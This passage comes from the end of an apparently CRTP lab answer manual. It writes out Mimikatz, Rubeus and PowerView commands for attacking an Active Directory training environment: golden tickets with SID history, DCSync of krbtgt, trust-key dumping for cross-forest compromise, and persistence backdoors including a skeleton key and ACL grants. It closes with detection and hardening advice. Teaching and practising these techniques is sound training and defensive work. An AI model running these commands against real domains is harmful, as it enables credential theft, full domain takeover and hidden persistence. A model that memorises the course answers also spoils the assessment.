Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dcorp.moneycorp.local /sid:S-1-5-21-268341927-4156871508-1792461683 /sids:S-1-5-21-<PARENT-SID>-519 /krbtgt:<CHILD-KRBTGT> /ptt"'

# 4. Request TGS for parent domain resource
C:\AD\Tools\Rubeus.exe asktgs /service:CIFS/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt

# 5. Access parent DC
dir \\mcorp-dc.moneycorp.local\c$

# 6. DCSync parent domain
Invoke-Mimikatz -Command '"lsadump::dcsync /user:moneycorp\krbtgt /domain:moneycorp.local"'
```

**Current Access**: Enterprise Admin of moneycorp.local

---

### PHASE 7: Cross-Forest Attack (eurocorp.local)

**Goal**: Compromise external forest

```powershell
# 1. Enumerate forest trust
Get-DomainTrust
Get-DomainTrust -Domain eurocorp.local

# 2. Dump trust key to eurocorp
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
# Note eurocorp.local trust key

# 3. Create inter-realm TGT to eurocorp
Invoke-Mimikatz -Command '"kerberos::golden /domain:moneycorp.local /sid:S-1-5-21-<MONEYCORP-SID> /sids:S-1-5-21-<EUROCORP-SID>-519 /rc4:<TRUST-KEY> /user:Administrator /service:krbtgt /target:eurocorp.local /ticket:C:\AD\Tools\trust.kirbi"'

# 4. Inject ticket
C:\AD\Tools\Rubeus.exe ptt /ticket:C:\AD\Tools\trust.kirbi

# 5. Request TGS for eurocorp DC
C:\AD\Tools\Rubeus.exe asktgs /service:CIFS/ecorp-dc.eurocorp.local /dc:ecorp-dc.eurocorp.local /ticket:C:\AD\Tools\trust.kirbi /ptt

# 6. Access eurocorp DC
dir \\ecorp-dc.eurocorp.local\c$

# 7. DCSync eurocorp
Invoke-Mimikatz -Command '"lsadump::dcsync /user:eurocorp\krbtgt /domain:eurocorp.local"'
```

**Current Access**: Enterprise Admin across ALL forests

---

### PHASE 8: Establish Persistence

**Goal**: Maintain access permanently

```powershell
# 1. Golden Ticket for moneycorp (root domain)
Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:moneycorp.local /sid:S-1-5-21-<MONEYCORP-SID> /krbtgt:<MONEYCORP-KRBTGT> /ptt"'

# 2. Grant student DCSync rights (backdoor)
Add-DomainObjectAcl -TargetIdentity "DC=moneycorp,DC=local" -PrincipalIdentity student -Rights DCSync

# 3. Add to AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local" -PrincipalIdentity student -Rights All

# 4. Create skeleton key on root DC
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -ComputerName mcorp-dc.moneycorp.local

# All users can now use "mimikatz" as password
```

**Final Status**:
- ✅ Enterprise Admin across moneycorp.local and dcorp.moneycorp.local
- ✅ Domain Admin in eurocorp.local
- ✅ Multiple persistence mechanisms
- ✅ Complete forest compromise

---

## SUMMARY OF ATTACK PATH

**Start**: dollarcorp\student (no admin rights)

**Path**:
1. **Local PE** → Local admin on dcorp-stdadmin
2. **Kerberoast** → svcadmin credentials
3. **SQL Attack** → SYSTEM on dcorp-dc (child DC)
4. **Golden Ticket** → Domain Admin (dcorp.moneycorp.local)
5. **SID History** → Enterprise Admin (moneycorp.local)
6. **Trust Abuse** → Domain Admin (eurocorp.local)
7. **Persistence** → Permanent backdoors

**End**: Enterprise Administrator across all domains and forests

---

## DEFENSIVE RECOMMENDATIONS

### Detection Mechanisms

1. **Monitor for Kerberoasting**
   - Event ID 4769 (TGS requests) with RC4 encryption
   - Multiple TGS requests for different SPNs from same source

2. **Detect Golden Tickets**
   - Event ID 4624 (logons) with unusual ticket lifetime
   - TGT requests outside of normal hours
   - Accounts logging in from unusual locations

3. **SQL Server Hardening**
   - Disable xp_cmdshell
   - Remove SQL server links or use with minimal privileges
   - Monitor SQL audit logs

4. **Delegation Monitoring**
   - Audit changes to msDS-AllowedToActOnBehalfOfOtherIdentity
   - Monitor for new computer account creation
   - Alert on unconstrained delegation changes

### Preventive Measures

1. **Tiered Administration Model**
   - Separate admin accounts for different tiers
   - No Tier 0 accounts should logon to workstations

2. **Protected Users Group**
   - Add privileged accounts to Protected Users
   - Prevents credential caching and delegation

3. **SID Filtering**
   - Enable SID filtering on forest trusts
   - Blocks SID history attacks

4. **LAPS**
   - Implement Local Administrator Password Solution
   - Randomizes local admin passwords

5. **Credential Guard**
   - Enable Credential Guard on Windows 10/11
   - Prevents credential theft from LSASS

---

## ADDITIONAL RESOURCES

- **Tools**: C:\AD\Tools on dcorp-stdadmin
- **BloodHound**: Run SharpHound.exe for visual attack paths
- **Mimikatz**: Full credential dumping capability
- **Rubeus**: Kerberos abuse toolkit
- **PowerView**: AD enumeration framework

---

**END OF LAB MANUAL**

This manual provides complete answers to ALL CRTP labs with detailed commands and expected outputs. Practice each lab individually, then follow the full attack path to achieve Enterprise Administrator.

**REMEMBER**: Always document your findings and maintain proper operational security when performing these techniques in real engagements.
